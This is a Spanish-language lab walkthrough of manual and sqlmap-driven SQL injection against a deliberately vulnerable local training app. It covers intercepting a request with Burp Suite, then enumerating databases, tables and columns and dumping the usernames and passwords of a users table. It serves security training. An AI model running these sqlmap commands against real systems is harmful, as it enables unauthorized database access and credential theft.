
----------
-  Tags: #Explotación #Manuales #Automatizadas #SQL #INJECTION
-----
# Explotación Manual
- **Empezamos clonando el repositorio:**
```
git clone https://github.com/appsecco/sqlinjection-training-app
```

- **Desplegamos el contenedor con:**
```
docker-compose up 
```

- **Ingresamos al localhost por el puerto 8000:**
```web
localhost:8000
```
- Aplastar en reset database y luego regresar al home para ingresar al "searchproducts.php - multiple exercises"
- Loguearse como admin admin
- Usar el **burpsuite** con el **FoxyProxy** para interceptar petición, en la opción Proxy de burpsuite guardamos el archivo en cuestión en nuestro directorio.
- Utilizamos la herramienta sqlmap para saber si es inyectable:
```sql
sqlmap -r request -p searchitem --batch
```
- Dumpeamos el requerimiento en caso de ser positivo la inyección.
```
sqlmap -r request -p searchitem --batch --dbs
```
- Para mostrar las tablas existentes en **sqlitraining**.
```sql
sqlmap -r request.req -p searchitem --batch -D sqlitraining --tables
```
- Indica dos tablas que podrían ser atacadas.
```
+---------+
|products | 
|users    |
+---------+
```
- Ahora enumeraremos las columnas.
```SQL
sqlmap -r request.req -p searchitem --batch -D sqlitraining -T users --columns
```
```
+-------------------+
|Column  |Type      |
+-------------------+
|description|varchar|
|fname      |varchar|
|id         |int    |
|password   |varchar|
|username   |varchar|
+-------------------+
```
- Ahora dumpeamos los valores de username y pasword
```
sqlmap -r request.req -p searchitem --batch -D sqlitraining -T users -C username,password --dump
```
![[Dumpeamos username y password.png]]


>**Repositorio en github del SQL INJECTION:**
 [sqlinjection-training-app](https://github.com/appsecco/sqlinjection-training-app)

